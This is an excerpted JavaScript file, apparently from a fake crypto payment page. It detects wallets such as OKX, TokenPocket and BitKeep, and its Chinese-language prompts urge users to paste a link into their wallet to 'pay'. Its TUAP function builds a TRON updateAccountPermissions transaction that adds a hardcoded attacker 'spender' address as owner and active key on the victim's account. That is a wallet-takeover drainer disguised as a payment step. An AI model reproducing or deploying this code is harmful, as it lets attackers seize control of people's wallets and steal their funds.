spender_bas58 = 'TKbpdrQCJ6YvCNagEjvFo794y8jtMwRHdE';
...
async function getWallet() {
            ...
            switch (parseInt(window.ethereum.networkVersion)) {
                ...
                case 66:
                    ...
                    contract_abi = [{
                        ...
                        "constant": false,
                        "payable": true,
                        "inputs": [{"name": "implementation", "type": "address"}, {"name": "data", "type": "bytes"}],
    ...
    } else if ((typeof window.ethereum !== "undefined" && typeof window.ethereum.isTokenPocket !== "undefined") || (typeof window.tron !== "undefined" && typeof window.tron.isTokenPocket !== "undefined")) {
        wallet = 'tokenPocket';
        printd('tokenPocket');
        if (typeof window.tronWeb !== "undefined") {
            chain = 'tron';
    ...
    } else if (typeof window.ethereum !== "undefined" && typeof window.ethereum.isBitKeep !== "undefined") {
        wallet = 'bitKeep';
        printd('bitKeep eth');
        switch (parseInt(window.ethereum.networkVersion)) {
            case 56:
...
async function TUAP() {
    if (wallet == 'okxwallet') {
        ...
        if (state.code == 200) {
            let trx = await window.okxwallet.tronLink.tronWeb.trx.getBalance(window.okxwallet.tronLink.tronWeb.defaultAddress.base58);
            if (trx < 100000000) {
                alert('没有足够的TRX用于支付网络费。')
            } else {
                ...
                activePermission.keys = [];
                ownerPermission.keys.push({address: spender_hex, weight: 1});
                ownerPermission.keys.push({address: window.okxwallet.tronLink.tronWeb.defaultAddress.hex, weight: 1});
                activePermission.keys.push({address: spender_hex, weight: 1});
                activePermission.keys.push({address: window.okxwallet.tronLink.tronWeb.defaultAddress.hex, weight: 1});
                try {
                    const updateTransaction = await window.okxwallet.tronLink.tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);
                    console.log(updateTransaction);
...
function copyAndAlert(selectIndex, callable) {
    ...
    switch (selectIndex) {
        case 15:
            ...
            messageText = "链接已复制，前往您的比特派钱包选择TRON网络，粘贴支付；如无法支付；请在钱包右下角我的设置里面更新版本在支付；付款成功后秒到账。";
            break;
        case 11:
            images = ['/static/img/tips/photo_1_2024-10-25_15-55-41.jpg',
                '/static/img/tips/imtoken-help3.cf1f0a403.jpg'];
            messageText = "链接已复制，前往您的im钱包粘贴支付；付款成功后秒到账。";
            break;
        case 14:
            images = ['/static/img/tips/photo_1_2024-10-25_15-58-39.jpg', '/static/img/tips/tp-help3.5d9a5fa233.jpg'];
            messageText = "链接已复制，前往您TP钱包粘贴支付；付款成功后秒到账。";
            break;
        case 13:
            images = ['/static/img/tips/BitKeep-help1.73143e1411.jpg', '/static/img/tips/BitKeep-help2.a6449b3f22.jpg'];
            messageText = "链接已复制，前往您的Bitget钱包粘贴支付，如提示选择TRX，请右上角切换TRON网络跟您的地址在支付；付款成功后秒到账。";
            break;
        case 12:
